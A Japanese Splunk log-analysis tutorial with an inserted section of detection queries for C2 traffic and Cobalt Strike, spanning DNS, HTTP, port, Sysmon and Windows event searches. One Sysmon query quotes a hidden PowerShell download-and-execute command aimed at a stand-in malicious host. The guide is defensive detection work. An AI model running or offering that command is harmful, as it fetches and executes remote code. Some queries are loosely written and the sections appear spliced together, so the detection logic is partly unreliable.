# Splunkでのログ解析のやり方

Splunkは、機械データの収集、インデクシング、検索、可視化を行う強力なログ解析ツールです。Splunkを使用することで、大量のログデータから洞察を得ることができます。以下に、Splunkでのログ解析の基本的な手順と方法を説明します。

## 目次
1. [Splunkの概要](#splunkの概要)
2. [データのインデクシング](#データのインデクシング)
3. [データの検索](#データの検索)
4. [ダッシュボードと可視化](#ダッシュボードと可視化)
5. [アラートの設定](#アラートの設定)
6. [レポートの作成](#レポートの作成)

## Splunkの概要

Splunkは、ログデータの収集、インデクシング、検索、分析、可視化を行うプラットフォームです。以下の主要な機能があります。
- **データのインデクシング**: 様々なデータソースからデータを取り込み、検索可能な形式に変換します。
- **検索とクエリ**: 検索クエリを使用して、必要な情報を迅速に取得できます。
- **可視化**: ダッシュボードやチャートを作成し、データを視覚的に分析します。
- **アラート**: 特定の条件に基づいてアラートを設定し、リアルタイムで通知を受け取ります。

## データのインデクシング

Splunkにデータをインデックスすることで、検索や解析が可能になります。以下は、データのインデクシング方法です。

### 手順
1. **データソースの追加**:
   - Splunkのウェブインターフェースから**「Settings」** > **「Data Inputs」**を選択し、新しいデータソースを追加します。
   - ファイル、フォルダー、ネットワークソースなどからデータを取り込みます。

2. **データの設定**:
   - インデクシングするデータの種類に応じて、適切な設定を行います（例: ストレージパス、データ形式）。

3. **データのインデクシング**:
   - データがSplunkに取り込まれ、インデックスが作成されます。これにより、データの検索が可能になります。

### 例
```plaintext
# ファイルからデータをインデックスする例
/settings/data_inputs/filesystem/
```

## データの検索

Splunkでは、検索クエリを使用してインデクシングされたデータを抽出し、分析します。

### 検索クエリの基本
- **検索**: 単純なキーワード検索を行います。
- **フィルタリング**: 時間範囲やフィールドでデータをフィルタリングします。
- **集計**: データを集計し、統計情報を生成します。

### 例
```spl
# 検索クエリの例
index="main" sourcetype="access_combined" status=404
```

### SplunkでのC2トラフィック検索

### 1. DNSリクエストの検索

C2トラフィックの一部はDNSリクエストを利用することがあります。特に、特定のドメインやサブドメインに対するリクエストを監視します。

**例**: C2ドメインに対するDNSクエストを検索する

```plaintext
index=dns_logs | search query="*c2domain.com*"
```

### 2. HTTPリクエストの検索

HTTPベースのC2トラフィックを検出するために、異常なリクエストパターンや特定のURLパスを探します。

**例**: `User-Agent`が`malicious-agent`であるHTTPリクエストを検索する

```plaintext
index=web_logs | search "User-Agent=malicious-agent"
```

### 3. ポート番号によるフィルタリング

C2トラフィックが特定のポートを使用する場合、そのポート番号でフィルタリングします。

**例**: 特定のポート（例: `4444`）を使用しているトラフィックを検索する

```plaintext
index=network_logs | search dest_port=4444
```

### 4. 特定のプロトコルによる検索

C2トラフィックが特定のプロトコル（例: TCP）を使用している場合、そのプロトコルでフィルタリングします。

**例**: TCPトラフィックで異常な接続を探す

```plaintext
index=network_logs | search protocol=TCP
```

### 5. エキスパートによる異常検知

異常なデータ転送量や予期しないタイミングのトラフィックはC2の兆候です。

**例**: 大量のデータ転送が行われているセッションを検索する

```plaintext
index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000
```

### 6. 高度な分析と相関

複数のデータソースを組み合わせて、より高度なC2トラフィックの分析を行います。

**例**: DNSリクエストとHTTPリクエストを相関させて分析する

```plaintext
index=dns_logs OR index=web_logs | stats count by src_ip, dest_ip, query, User-Agent
```

Cobalt StrikeのログをSplunkで検索する場合、Cobalt Strikeは特定のパターンや行動を持つため、それに基づいてログを検索します。以下に、Cobalt StrikeのトラフィックやアクティビティをSplunkで検索する方法を示します。

---

## Cobalt Strikeのログ検索

### 1. **Cobalt Strikeの一般的な特徴**

Cobalt Strikeのアクティビティは以下のような特徴があります：
- **特定のポート**: デフォルトでポート`50050`を使用することが多い。
- **HTTP/HTTPSトンネリング**: Cobalt StrikeはHTTP/HTTPSでトンネリングすることがある。
- **DNSトンネリング**: Cobalt StrikeのC2サーバーがDNSリクエストを使う場合もある。

### 2. **特定のポートによる検索**

Cobalt Strikeが使用する可能性のあるポート（例: `50050`）でトラフィックを検索します。

**例**: ポート`50050`を使用しているトラフィックを検索する

```plaintext
index=network_logs | search dest_port=50050
```

### 3. **HTTP/HTTPSトンネリングの検出**

Cobalt StrikeはHTTP/HTTPSで通信することがあるため、異常な`User-Agent`や特定のURIパスを探します。

**例**: 特定の`User-Agent`を持つHTTPリクエストを検索する

```plaintext
index=web_logs | search "User-Agent=CobaltStrike"
```

**例**: 特定のURIパスが含まれるリクエストを検索する

```plaintext
index=web_logs | search uri_path="/path/to/command"
```

### 4. **DNSトンネリングの検出**

Cobalt StrikeがDNSトンネリングを使用する場合、特定のドメインや長いサブドメインを探します。

**例**: 特定のドメインを含むDNSクエリを検索する

```plaintext
index=dns_logs | search query="*.maliciousdomain.com"
```

**例**: 異常に長いDNSクエリを検索する

```plaintext
index=dns_logs | search length(query) > 50
```

### 5. **異常なデータ転送量の検出**

Cobalt Strikeのセッションは異常なデータ転送量を示すことがあります。

**例**: 大量のデータ転送が行われているセッションを検索する

```plaintext
index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000
```

### 6. **コマンドやアクティビティの検出**

Cobalt Strikeが実行するコマンドやアクティビティを検出するために、ログに記録されたコマンドを検索します。

**例**: 特定のコマンドが含まれるログを検索する

```plaintext
index=sysmon_logs | search "cmdline=\"powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/payload')\""
```


Cobalt Strikeのイベントログ検索

1. Sysmonログでの検出

Sysmon（System Monitor）は、Windowsイベントログを詳細に記録するツールで、Cobalt Strikeのアクティビティを検出するのに役立ちます。

1.1 PowerShellコマンドの監視

Cobalt StrikeはPowerShellコマンドを実行することがあります。SysmonイベントID1（プロセス作成イベント）でPowerShellコマンドを監視します。

例: PowerShellコマンドラインにiex（Invoke-Expression）が含まれるイベントを検索する

index=sysmon_logs sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 | search CommandLine="iex*"

1.2 ネットワーク接続の監視

SysmonイベントID3（ネットワーク接続イベント）でCobalt StrikeのC2トラフィックを検出します。

例: 特定のポートへのネットワーク接続を検索する

index=sysmon_logs sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 | search DestinationPort=50050

1.3 ファイル作成イベントの監視

SysmonイベントID11（ファイル作成イベント）で、Cobalt Strikeのペイロードやマルウェアファイルの作成を検出します。

例: 特定のファイルパスに関連するイベントを検索する

index=sysmon_logs sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 | search FileName="*.exe"

2. Windowsイベントログでの検出

Windowsイベントログでも、Cobalt Strikeの活動に関連する情報を検索できます。

2.1 イベントID4688（プロセス作成）

新しく作成されたプロセスを監視します。

例: 特定のコマンドラインオプションを含むプロセス作成イベントを検索する

index=windows_logs sourcetype=WinEventLog:Security EventCode=4688 | search CommandLine="powershell*"

2.2 イベントID5156（ネットワーク接続の許可）

ネットワーク接続に関する情報を確認します。

例: 特定のポートへの接続を検索する

index=windows_logs sourcetype=WinEventLog:Security EventCode=5156 | search DestinationPort=50050

3. カスタムフィルタリングとアラート

特定の条件に基づいてアラートを設定し、Cobalt Strikeのアクティビティをリアルタイムで監視します。

3.1 高データ転送量の監視

Cobalt Strikeは大量のデータを転送することがあるため、大量のデータ転送を検出します。

例: 特定のIPアドレス間での大容量データ転送を監視する

index=network_logs | stats sum(bytes) by src_ip, dest_ip | where sum(bytes) > 1000000

3.2 定期的なDNSリクエストの監視

Cobalt StrikeのC2サーバーがDNSトンネリングを使用する場合があります。

例: 短時間で多数のDNSリクエストを検索する

index=dns_logs | timechart span=1m count by query | where count > 100

---

このガイドを使って、Cobalt StrikeのログをSplunkで効果的に検索し、異常なアクティビティを検出することができます。
---

このガイドを参考にして、SplunkでのC2トラフィックの検索と分析を効果的に行うことができます。
## ダッシュボードと可視化

Splunkでは、検索結果をダッシュボードやチャートで可視化し、データの洞察を得ることができます。

### 手順
1. **ダッシュボードの作成**:
   - **「Dashboards」**セクションから新しいダッシュボードを作成します。
   - 各パネルに検索クエリや可視化を追加します。

2. **可視化の設定**:
   - グラフ、チャート、テーブルなど、適切な可視化形式を選択します。
   - ダッシュボードのレイアウトやデザインをカスタマイズします。

### 例
```spl
# 例: トラフィックの時間帯別分布を可視化するクエリ
index="web" | timechart count by status
```

## アラートの設定

Splunkでアラートを設定することで、特定の条件に基づいた通知を受け取ることができます。

### 手順
1. **アラートの作成**:
   - **「Alerts」**セクションから新しいアラートを作成します。
   - 条件（例: 特定の検索クエリやしきい値）を設定します。

2. **アラートアクションの設定**:
   - アラートがトリガーされたときに実行されるアクション（例: メール通知、Webhook）を設定します。

### 例
```spl
# 例: 404エラーが100件を超えた場合にアラートをトリガー
index="main" sourcetype="access_combined" status=404 | stats count | where count > 100
```

## レポートの作成

Splunkでは、検索結果をレポートとして保存し、定期的に生成することができます。

### 手順
1. **レポートの作成**:
   - **「Reports」**セクションから新しいレポートを作成します。
   - 検索クエリとレポートの形式を設定します。

2. **スケジュールの設定**:
   - レポートの生成スケジュールを設定し、定期的に自動生成させます。

### 例
```spl
# 例: トラフィックの月別レポート
index="web" | timechart span=1mon count
```

## まとめ

Splunkを使用することで、ログデータの収集、インデクシング、検索、可視化、アラート設定、レポート作成が効率的に行えます。これにより、システムの監視やセキュリティインシデントの分析を迅速に行うことができます。
